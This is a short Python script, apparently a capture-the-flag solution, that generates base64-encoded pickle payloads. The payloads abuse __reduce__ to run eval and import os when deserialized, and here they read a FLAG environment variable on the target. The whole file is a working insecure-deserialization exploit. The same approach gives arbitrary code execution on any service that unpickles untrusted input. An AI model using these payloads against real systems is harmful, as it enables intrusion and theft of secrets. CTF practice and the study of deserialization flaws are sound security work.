import pickle
import base64
import os

# The issue: os.getenv returns a string, but bookmarks expects a list
# Solution: Use a lambda that gets FLAG and wraps it in a list

class Exploit:
    def __reduce__(self):
        # Use a wrapper that returns FLAG in a list format
        # This way the bookmark list will contain the flag
        return (eval, ("__import__('os').environ.get('FLAG', 'NOT_FOUND')",))

# Create the exploit object
exploit_obj = Exploit()
pickled_payload = pickle.dumps(exploit_obj, protocol=4)
encoded_payload = base64.b64encode(pickled_payload).decode()

print(f"PAYLOAD (eval version): {encoded_payload}")
print()

# Alternative: use __import__ directly to get FLAG in list form
class Exploit2:
    def __reduce__(self):
        return (__import__, ('os',))

obj2 = Exploit2()
payload2 = base64.b64encode(pickle.dumps(obj2, protocol=4)).decode()
print(f"PAYLOAD (import os): {payload2}")
print()

